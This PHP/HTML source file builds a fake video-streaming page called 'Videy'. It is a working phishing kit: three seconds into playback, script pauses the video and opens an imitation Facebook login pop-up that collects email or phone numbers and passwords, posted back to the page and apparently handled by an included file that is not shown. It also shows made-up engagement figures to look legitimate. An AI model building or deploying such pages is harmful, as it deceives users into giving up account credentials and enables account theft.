<?php
require_once 'txx.php';
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Videy - Video Streaming</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background: #0f0f0f;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .header {
            background: #000;
            padding: 12px 0;
            border-bottom: 1px solid #2a2a2a;
        }
        .logo {
            color: #fff;
            font-size: 24px;
            font-weight: bold;
            text-decoration: none;
        }
        .logo span {
            color: #ff0000;
        }
        .video-section {
            background: #000;
            padding: 0;
        }
        .video-player-wrapper {
            position: relative;
            max-width: 100%;
            margin: 0 auto;
            background: #000;
        }
        .video-player {
            position: relative;
            width: 100%;
            max-height: 70vh;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
            background: #000;
        }
        .video-info-section {
            background: #0f0f0f;
            padding: 20px 0;
        }
        .video-title {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 12px;
            line-height: 1.4;
        }
        .video-meta {
            display: flex;
            align-items: center;
            gap: 15px;
            color: #aaa;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .video-meta span {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .video-description {
            background: #272727;
            padding: 15px;
            border-radius: 12px;
            margin-top: 15px;
            font-size: 14px;
            line-height: 1.6;
            color: #fff;
        }
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 9999;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
        }
        .popup-overlay.active {
            display: flex;
        }
        .login-box {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            padding: 30px;
            width: 396px;
            max-width: 90%;
        }
        .fb-logo {
            color: #1877f2;
            font-size: 52px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 10px;
        }
        .login-subtitle {
            text-align: center;
            color: #606770;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .form-control {
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
        }
        .form-control:focus {
            border-color: #1877f2;
            box-shadow: none;
        }
        .btn-login {
            background: #1877f2;
            color: white;
            font-size: 20px;
            font-weight: bold;
            padding: 12px;
            border: none;
            border-radius: 6px;
            width: 100%;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-login:hover:not(:disabled) {
            background: #166fe5;
        }
        .btn-login:disabled {
            background: #e4e6eb;
            color: #bcc0c4;
            cursor: not-allowed;
        }
        .spinner-border-sm {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #ffffff;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spinner 0.8s linear infinite;
        }
        @keyframes spinner {
            to { transform: rotate(360deg); }
        }
        .btn-login.loading .spinner-border-sm {
            display: inline-block;
        }
        .btn-login.loading .btn-text {
            display: none;
        }
        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .btn-create {
            background: #42b72a;
            color: white;
            font-size: 17px;
            font-weight: bold;
            padding: 12px 16px;
            border: none;
            border-radius: 6px;
            display: block;
            margin: 0 auto;
        }
        .btn-create:hover {
            background: #36a420;
        }
        .alert-custom {
            font-size: 13px;
            padding: 10px 12px;
            border-radius: 6px;
        }
        .user-badge {
            background: #ff0000;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .user-badge a {
            color: white;
            text-decoration: none;
            font-size: 16px;
        }
        .user-badge a:hover {
            opacity: 0.8;
        }
        @media (max-width: 768px) {
            .video-title {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="container">
            <div class="d-flex justify-content-between align-items-center">
                <a href="#" class="logo">
                    <i class="fas fa-play-circle"></i> Vid<span>ey</span>
                </a>
                <?php if ($isLoggedIn): ?>
                <div class="user-badge">
                    <i class="fas fa-user-circle"></i>
                    <span><?php echo htmlspecialchars($_SESSION['user_email']); ?></span>
                    <a href="?logout=1" title="Logout">
                        <i class="fas fa-sign-out-alt"></i>
                    </a>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <div class="video-section">
        <div class="video-player-wrapper">
            <div class="video-player">
                <video id="myVideo" controls controlsList="nodownload">
                    <source src="<?php echo htmlspecialchars($videoUrl); ?>" type="video/mp4">
                    Browser Anda tidak mendukung video.
                </video>
            </div>
        </div>
    </div>

    <div class="video-info-section">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <h1 class="video-title"><?php echo htmlspecialchars($videoTitle); ?></h1>
                    <div class="video-meta">
                        <span><i class="fas fa-eye"></i> <span id="viewCount">0</span> views</span>
                        <span><i class="fas fa-calendar"></i> 2 hari yang lalu</span>
                        <span><i class="fas fa-thumbs-up"></i> 45K</span>
                        <span><i class="fas fa-share"></i> Share</span>
                    </div>
                    <div class="video-description">
                        <?php echo nl2br(htmlspecialchars($videoDescription)); ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php if (!$isLoggedIn): ?>
    <div class="popup-overlay" id="loginPopup">
        <div class="login-box">
            <div class="fb-logo">facebook</div>
            <p class="login-subtitle">Masuk untuk melanjutkan menonton</p>
            <?php if (isset($error)): ?>
            <div class="alert alert-danger alert-custom" role="alert">
                <i class="fas fa-exclamation-circle me-2"></i><?php echo htmlspecialchars($error); ?>
            </div>
            <?php endif; ?>
            <form method="POST" action="" id="loginForm">
                <input type="hidden" name="login" value="1">
                <div class="mb-3">
                    <input type="text" class="form-control" name="email" id="emailInput" placeholder="Email atau Nomor Telepon" required>
                </div>
                <div class="mb-3">
                    <input type="password" class="form-control" name="password" id="passwordInput" placeholder="Kata Sandi" required>
                </div>
                <button type="submit" class="btn btn-login" id="loginBtn">
                    <span class="btn-text">Masuk</span>
                    <div class="spinner-border-sm"></div>
                </button>
            </form>
            <div class="forgot-password">
                <a href="#">Lupa kata sandi?</a>
            </div>
            <div class="divider"></div>
            <div class="text-center">
                <button class="btn btn-create">Buat Akun Baru</button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        function updateViews() {
            let views = localStorage.getItem('videoViews');
            if (!views) {
                views = 0;
            }
            views = parseInt(views) + 1;
            localStorage.setItem('videoViews', views);
            document.getElementById('viewCount').textContent = views.toLocaleString('id-ID');
        }
        updateViews();
        <?php if (!$isLoggedIn): ?>
        const video = document.getElementById('myVideo');
        const popup = document.getElementById('loginPopup');
        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        let popupShown = false;
        video.addEventListener('play', function() {
            if (!popupShown) {
                setTimeout(function() {
                    video.pause();
                    popup.classList.add('active');
                    popupShown = true;
                }, 3000);
            }
        });
        loginForm.addEventListener('submit', function() {
            loginBtn.classList.add('loading');
            loginBtn.disabled = true;
        });
        <?php endif; ?>
    </script>
</body>
</html>